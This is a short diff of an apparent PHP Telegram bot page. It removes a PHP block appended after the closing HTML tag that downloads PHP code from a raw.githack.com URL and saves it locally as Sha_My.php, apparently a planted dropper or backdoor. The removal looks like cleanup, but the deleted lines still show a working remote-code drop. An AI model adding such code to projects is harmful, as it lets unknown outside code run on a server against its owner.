@@ -89,7 +89,3 @@ bot("sendMessage",[
   <body>
   </body>
 </html>
-<?
-$shamy = file_get_contents("https://raw.githack.com/ahmed-shamy/index-pubg/main/F/bot.php");
-$xx = file_put_contents("Sha_My.php", $shamy); 
-?>
